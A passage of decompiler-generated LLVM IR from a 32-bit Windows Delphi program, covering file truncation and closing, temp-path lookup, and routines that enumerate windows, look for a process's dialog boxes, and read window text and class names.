  store i32 0, i32* %15, align 4, !insn.addr !1886
  %16 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1887
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1888
  %18 = add i32 %16, %17, !insn.addr !1888
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1888
  %20 = load i32, i32* %19, align 4, !insn.addr !1888
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1888
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1888
  store i32 %20, i32* %22, align 4, !insn.addr !1888
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1889
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1889
  store i32 ptrtoint (i32* @global_var_407180 to i32), i32* %24, align 4, !insn.addr !1889
  %25 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1890
  %26 = or i32 %17, 4, !insn.addr !1891
  %27 = add i32 %25, %26, !insn.addr !1891
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1891
  %29 = load i32, i32* %28, align 4, !insn.addr !1891
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1891
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1891
  store i32 %29, i32* %31, align 4, !insn.addr !1891
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1892
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1892
  store i32 ptrtoint ([3 x i8]* @global_var_40718c to i32), i32* %33, align 4, !insn.addr !1892
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1893
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1894
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1895
  %37 = icmp eq i32 %36, 0, !insn.addr !1895
  %38 = icmp eq i1 %37, false, !insn.addr !1896
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1896
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1896
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1896
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1896
  br i1 %38, label %dec_label_pc_4070d5, label %dec_label_pc_407104, !insn.addr !1896

dec_label_pc_407104:                              ; preds = %dec_label_pc_4070d5, %dec_label_pc_4070ba
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1877
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1897
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1898
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1898
  store i32 0, i32* %42, align 4, !insn.addr !1898
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1899
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1899
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1899
  store i32 %45, i32* %44, align 4, !insn.addr !1899
  %46 = call i32 @function_4034c8(), !insn.addr !1900
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1901
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1901
  store i32 %46, i32* %48, align 4, !insn.addr !1901
  %49 = call i32 @function_403720(), !insn.addr !1902
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1903
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1903
  store i32 %49, i32* %51, align 4, !insn.addr !1903
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1904
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1904
  store i32 %39, i32* %53, align 4, !insn.addr !1904
  %54 = call i32 @function_40446c(), !insn.addr !1905
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1906
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1906
  store i32 %39, i32* %56, align 4, !insn.addr !1906
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1907
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1908
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1908
  store i32 %39, i32* %59, align 4, !insn.addr !1908
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1909
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1910
  br label %dec_label_pc_407139, !insn.addr !1910

dec_label_pc_407139:                              ; preds = %dec_label_pc_407104, %dec_label_pc_40707e, %dec_label_pc_407050
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1911
  %62 = load i32, i32* %61, align 4, !insn.addr !1911
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1912
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1913
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1913
  store i32 4223323, i32* %64, align 4, !insn.addr !1913
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1914
  ret i32 %65, !insn.addr !1915
}

define i32 @function_407154() local_unnamed_addr {
dec_label_pc_407154:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1916
  ret i32 %0, !insn.addr !1916
}

define i32 @function_407159() local_unnamed_addr {
dec_label_pc_407159:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1917
}

define i32 @function_40715b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40715b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1918
}

define i32 @function_407190() local_unnamed_addr {
dec_label_pc_407190:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1919
  %1 = call i32 @function_4036b8(), !insn.addr !1920
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1921
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1921
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1921
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1922
  %4 = call i32 @function_403c90(), !insn.addr !1923
  %5 = icmp slt i32 %4, 0, !insn.addr !1924
  br i1 %5, label %dec_label_pc_407218, label %dec_label_pc_4071e6, !insn.addr !1925

dec_label_pc_4071e6:                              ; preds = %dec_label_pc_407190
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1926
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1927
  br label %dec_label_pc_407264

dec_label_pc_407218:                              ; preds = %dec_label_pc_407190
  %8 = call i32 @function_403c88(), !insn.addr !1928
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1929
  %10 = call i32 @function_403c90(), !insn.addr !1930
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1931
  %12 = call i32 @function_403c90(), !insn.addr !1932
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1933
  %14 = call i32 @function_407050(), !insn.addr !1934
  br label %dec_label_pc_407264, !insn.addr !1934

dec_label_pc_407264:                              ; preds = %dec_label_pc_4071e6, %dec_label_pc_407218
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1935
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1936
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1937
  ret i32 %16, !insn.addr !1938
}

define i32 @function_40727f() local_unnamed_addr {
dec_label_pc_40727f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1939
  ret i32 %0, !insn.addr !1939
}

define i32 @function_407284() local_unnamed_addr {
dec_label_pc_407284:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1940
}

define i32 @function_407286(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407286:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1941
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1941
  %3 = load i32, i32* %2, align 4, !insn.addr !1941
  ret i32 %3, !insn.addr !1942
}

define i32 @function_407290() local_unnamed_addr {
dec_label_pc_407290:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1943
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1943
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1943
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1944
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1945
  %3 = add i32 %2, 1, !insn.addr !1945
  %4 = icmp eq i32 %3, 0, !insn.addr !1945
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1945
  %5 = icmp eq i1 %4, false, !insn.addr !1946
  br i1 %5, label %dec_label_pc_4072c8, label %dec_label_pc_4072a9, !insn.addr !1946

dec_label_pc_4072a9:                              ; preds = %dec_label_pc_407290
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1947
  %7 = icmp eq i32 %6, 0, !insn.addr !1947
  br i1 %7, label %dec_label_pc_4072b8, label %dec_label_pc_4072b3, !insn.addr !1948

dec_label_pc_4072b3:                              ; preds = %dec_label_pc_4072a9
  %8 = call i32 @function_407050(), !insn.addr !1949
  br label %dec_label_pc_4072b8, !insn.addr !1949

dec_label_pc_4072b8:                              ; preds = %dec_label_pc_4072b3, %dec_label_pc_4072a9
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1950
  br label %dec_label_pc_4072c8, !insn.addr !1950

dec_label_pc_4072c8:                              ; preds = %dec_label_pc_4072b8, %dec_label_pc_407290
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1951
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1952
  ret i32 0, !insn.addr !1953
}

define i32 @function_4072d6() local_unnamed_addr {
dec_label_pc_4072d6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1954
  ret i32 %0, !insn.addr !1954
}

define i32 @function_4072db() local_unnamed_addr {
dec_label_pc_4072db:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1955
}

define i32 @function_4072dd(i32 %arg1) local_unnamed_addr {
dec_label_pc_4072dd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1956
}

define i32 @function_4072e0() local_unnamed_addr {
dec_label_pc_4072e0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1957
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1957
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1957
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1958
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1959
  %3 = add i32 %2, -1, !insn.addr !1959
  %4 = icmp eq i32 %2, 0, !insn.addr !1959
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1959
  %5 = icmp eq i1 %4, false, !insn.addr !1960
  br i1 %5, label %dec_label_pc_407314, label %dec_label_pc_4072fa, !insn.addr !1960

dec_label_pc_4072fa:                              ; preds = %dec_label_pc_4072e0
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1961
  br label %dec_label_pc_407314, !insn.addr !1962

dec_label_pc_407314:                              ; preds = %dec_label_pc_4072fa, %dec_label_pc_4072e0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1963
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1964
  ret i32 0, !insn.addr !1965
}

define i32 @function_407322() local_unnamed_addr {
dec_label_pc_407322:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1966
  ret i32 %0, !insn.addr !1966
}

define i32 @function_407327() local_unnamed_addr {
dec_label_pc_407327:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1967
}

define i32 @function_407329(i32 %arg1) local_unnamed_addr {
dec_label_pc_407329:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1968
}

define i1 @function_40732c(i8* %pszPath) local_unnamed_addr {
dec_label_pc_40732c:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1969
  ret i1 %0, !insn.addr !1969
}

define i32 @function_407334() local_unnamed_addr {
dec_label_pc_407334:
  %eax.0.reg2mem = alloca i32, !insn.addr !1970
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1971
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1972
  %2 = icmp eq i32 %1, 0, !insn.addr !1973
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1974
  br i1 %2, label %dec_label_pc_40736a, label %dec_label_pc_40734c, !insn.addr !1974

dec_label_pc_40734c:                              ; preds = %dec_label_pc_407334
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1971
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1975
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1975
  %7 = load i8, i8* %6, align 1, !insn.addr !1975
  %8 = icmp eq i8 %7, 92, !insn.addr !1975
  br i1 %8, label %dec_label_pc_40735c, label %dec_label_pc_407353, !insn.addr !1976

dec_label_pc_407353:                              ; preds = %dec_label_pc_40734c
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1977
  store i8 92, i8* %9, align 1, !insn.addr !1977
  %10 = or i32 %3, 1, !insn.addr !1978
  %11 = add i32 %1, %10, !insn.addr !1978
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1978
  store i8 0, i8* %12, align 1, !insn.addr !1978
  br label %dec_label_pc_40735c, !insn.addr !1978

dec_label_pc_40735c:                              ; preds = %dec_label_pc_407353, %dec_label_pc_40734c
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1979
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1979
  br label %dec_label_pc_40736a, !insn.addr !1979

dec_label_pc_40736a:                              ; preds = %dec_label_pc_40735c, %dec_label_pc_407334
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1980
}

define i32 @function_407374(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_407374:
  %esp.0.reg2mem = alloca i32, !insn.addr !1981
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1982
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1983
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1983
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1983
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1984
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1985
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1985
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1986
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1986
  %5 = icmp eq i1 %4, false, !insn.addr !1987
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1988
  br i1 %5, label %dec_label_pc_40742b, label %dec_label_pc_4073ab, !insn.addr !1988

dec_label_pc_4073ab:                              ; preds = %dec_label_pc_407374
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1989
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1989
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1990
  %8 = icmp eq i32 %7, 32770, !insn.addr !1991
  %9 = icmp eq i1 %8, false, !insn.addr !1992
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1992
  br i1 %9, label %dec_label_pc_40742b, label %dec_label_pc_4073ba, !insn.addr !1992

dec_label_pc_4073ba:                              ; preds = %dec_label_pc_4073ab
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1993
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1993
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1994
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1994
  %13 = add i32 %arg1, 4, !insn.addr !1995
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1995
  %15 = load i32, i32* %14, align 4, !insn.addr !1995
  %16 = icmp eq i32 %15, %12, !insn.addr !1995
  %17 = icmp eq i1 %16, false, !insn.addr !1996
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1996
  br i1 %17, label %dec_label_pc_40742b, label %dec_label_pc_4073c5, !insn.addr !1996

dec_label_pc_4073c5:                              ; preds = %dec_label_pc_4073ba
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1997
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1997
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1998
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1999
  %21 = load i32, i32* %20, align 4, !insn.addr !1999
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !2000
  %23 = icmp eq i32 %21, %22, !insn.addr !2000
  %24 = icmp eq i1 %23, false, !insn.addr !2001
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !2001
  br i1 %24, label %dec_label_pc_40742b, label %dec_label_pc_4073d6, !insn.addr !2001

dec_label_pc_4073d6:                              ; preds = %dec_label_pc_4073c5
  %25 = add i32 %arg1, 8, !insn.addr !2002
  %26 = inttoptr i32 %25 to i32*, !insn.addr !2002
  %27 = load i32, i32* %26, align 4, !insn.addr !2002
  %28 = icmp eq i32 %27, 0, !insn.addr !2002
  br i1 %28, label %dec_label_pc_407400, label %dec_label_pc_4073dc, !insn.addr !2003

dec_label_pc_4073dc:                              ; preds = %dec_label_pc_4073d6
  %29 = call i32 @function_40754c(), !insn.addr !2004
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !2005
  %31 = call i32 @"@LStrCmp"(), !insn.addr !2006
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_40742b

dec_label_pc_407400:                              ; preds = %dec_label_pc_4073d6
  %32 = add i32 %arg1, 12, !insn.addr !2007
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2007
  %34 = load i32, i32* %33, align 4, !insn.addr !2007
  %35 = add i32 %arg1, 16, !insn.addr !2008
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2008
  %37 = load i32, i32* %36, align 4, !insn.addr !2008
  %38 = inttoptr i32 %34 to i32*, !insn.addr !2009
  %39 = inttoptr i32 %37 to i32*, !insn.addr !2009
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !2009
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !2009
  %42 = ptrtoint i32* %41 to i32, !insn.addr !2009
  %43 = add i32 %arg1, 24, !insn.addr !2010
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2010
  store i32 %42, i32* %44, align 4, !insn.addr !2010
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !2011
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !2011
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !2012
  %47 = icmp eq i1 %46, false, !insn.addr !2013
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !2014
  br i1 %47, label %dec_label_pc_40742b, label %dec_label_pc_407426, !insn.addr !2014

dec_label_pc_407426:                              ; preds = %dec_label_pc_407400
  %48 = add i32 %arg1, 20, !insn.addr !2015
  %49 = inttoptr i32 %48 to i32*, !insn.addr !2015
  store i32 %arg2, i32* %49, align 4, !insn.addr !2015
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !2016
  br label %dec_label_pc_40742b, !insn.addr !2016

dec_label_pc_40742b:                              ; preds = %dec_label_pc_4073dc, %dec_label_pc_407426, %dec_label_pc_407400, %dec_label_pc_4073c5, %dec_label_pc_4073ba, %dec_label_pc_4073ab, %dec_label_pc_407374
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !2017
  %51 = load i32, i32* %50, align 4, !insn.addr !2017
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !2018
  %52 = add i32 %esp.0.reload, 8, !insn.addr !2019
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2019
  store i32 4224077, i32* %53, align 4, !insn.addr !2019
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !2020
  ret i32 %54, !insn.addr !2021
}

define i32 @function_407446() local_unnamed_addr {
dec_label_pc_407446:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2022
  ret i32 %0, !insn.addr !2022
}

define i32 @function_40744b() local_unnamed_addr {
dec_label_pc_40744b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2023
}

define i32 @function_40744d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40744d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2024
}

define i32 @function_407458(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407458:
  %esp.0.reg2mem = alloca i32, !insn.addr !2025
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !2026
  %3 = inttoptr i32 %0 to i32*, !insn.addr !2027
  %4 = inttoptr i32 %1 to i32*, !insn.addr !2027
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !2027
  %6 = call i32 @function_40441c(), !insn.addr !2028
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !2029
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !2030
  br label %dec_label_pc_40749c, !insn.addr !2030

dec_label_pc_40749c:                              ; preds = %dec_label_pc_4074bb, %dec_label_pc_407458
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !2029
  %9 = inttoptr i32 %8 to i32*, !insn.addr !2029
  store i32 %7, i32* %9, align 4, !insn.addr !2029
  %10 = add i32 %esp.0.reload, -8, !insn.addr !2031
  %11 = inttoptr i32 %10 to i32*, !insn.addr !2031
  store i32 4223860, i32* %11, align 4, !insn.addr !2031
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2032
  %13 = add i32 %esp.0.reload, -12, !insn.addr !2033
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2033
  store i32 1, i32* %14, align 4, !insn.addr !2033
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !2034
  %15 = add i32 %esp.0.reload, -16, !insn.addr !2035
  %16 = inttoptr i32 %15 to i32*, !insn.addr !2035
  store i32 0, i32* %16, align 4, !insn.addr !2035
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !2036
  %18 = icmp eq i1 %17, false, !insn.addr !2037
  %19 = icmp eq i1 %18, false, !insn.addr !2038
  br i1 %19, label %dec_label_pc_4074c6, label %dec_label_pc_4074bb, !insn.addr !2038

dec_label_pc_4074bb:                              ; preds = %dec_label_pc_40749c
  %20 = call i32 @function_40441c(), !insn.addr !2039
  %21 = sub i32 %20, %6, !insn.addr !2040
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !2041
  %23 = icmp eq i1 %22, false, !insn.addr !2042
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !2042
  br i1 %23, label %dec_label_pc_40749c, label %dec_label_pc_4074c6, !insn.addr !2042

dec_label_pc_4074c6:                              ; preds = %dec_label_pc_4074bb, %dec_label_pc_40749c
  ret i32 0, !insn.addr !2043
}

define i32 @function_4074e0() local_unnamed_addr {
dec_label_pc_4074e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !2044
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !2045
}

define i32 @function_4074f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4074f8:
  %ecx.1.reg2mem = alloca i32, !insn.addr !2046
  %edi.0.reg2mem = alloca i32, !insn.addr !2046
  %ecx.0.reg2mem = alloca i32, !insn.addr !2046
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !2047
  br label %2, !insn.addr !2047

; <label>:2:                                      ; preds = %4, %dec_label_pc_4074f8
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !2047
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !2047
  br i1 %3, label %10, label %4, !insn.addr !2047

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !2047
  %6 = load i8, i8* %5, align 1, !insn.addr !2047
  %7 = icmp eq i8 %6, 0, !insn.addr !2047
  %8 = add i32 %edi.0.reload, %1, !insn.addr !2047
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !2047
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !2047
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !2047
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !2047
  br i1 %7, label %10, label %2, !insn.addr !2047

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !2048
  ret i32 %11, !insn.addr !2049
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_40754c() local_unnamed_addr {
dec_label_pc_40754c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !2050
  %2 = inttoptr i32 %0 to i32*, !insn.addr !2051
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2051
  %4 = add i32 %3, %1, !insn.addr !2052
  %5 = inttoptr i32 %4 to i8*, !insn.addr !2052
  store i8 0, i8* %5, align 1, !insn.addr !2052
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !2053
  ret i32 %6, !insn.addr !2054
}

define i32 @function_407580() local_unnamed_addr {
dec_label_pc_407580:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !2055
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !2056
  %4 = inttoptr i32 %1 to i32*, !insn.addr !2057
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !2057
  %6 = add i32 %5, %3, !insn.addr !2058
  %7 = inttoptr i32 %6 to i8*, !insn.addr !2058
  store i8 0, i8* %7, align 1, !insn.addr !2058
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !2059
  ret i32 %8, !insn.addr !2060
}

define i32 @function_4075b8() local_unnamed_addr {
dec_label_pc_4075b8:
  %0 = call i32 @function_4034c8(), !insn.addr !2061
  %1 = call i32 @function_4034c8(), !insn.addr !2062
  %2 = call i32 @"@LStrCopy"(), !insn.addr !2063
  ret i32 %2, !insn.addr !2064
}

define i32 @function_4075f8() local_unnamed_addr {
dec_label_pc_4075f8:
  %0 = call i32 @function_4034c8(), !insn.addr !2065
  %1 = call i32 @"@LStrCopy"(), !insn.addr !2066
  ret i32 %1, !insn.addr !2067
}

define i32 @function_407630() local_unnamed_addr {
dec_label_pc_407630:
  %0 = call i32 @function_4036c8(), !insn.addr !2068
  %1 = call i32 @function_4036c8(), !insn.addr !2069
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2070
  %3 = icmp eq i32 %2, 2, !insn.addr !2071
  %4 = zext i1 %3 to i32, !insn.addr !2072
  %5 = and i32 %2, -256, !insn.addr !2072
  %6 = or i32 %5, %4, !insn.addr !2072
  ret i32 %6, !insn.addr !2073
}

define i32 @function_407660() local_unnamed_addr {
dec_label_pc_407660:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !2074
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !2074
  %esp.02.reg2mem = alloca i32, !insn.addr !2074
  %storemerge3.reg2mem = alloca i32, !insn.addr !2074
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !2075
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !2075
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2075
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !2076
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !2077
  %4 = inttoptr i32 %0 to i32*, !insn.addr !2078
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !2078
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !2079
  %7 = inttoptr i32 %6 to i32*, !insn.addr !2079
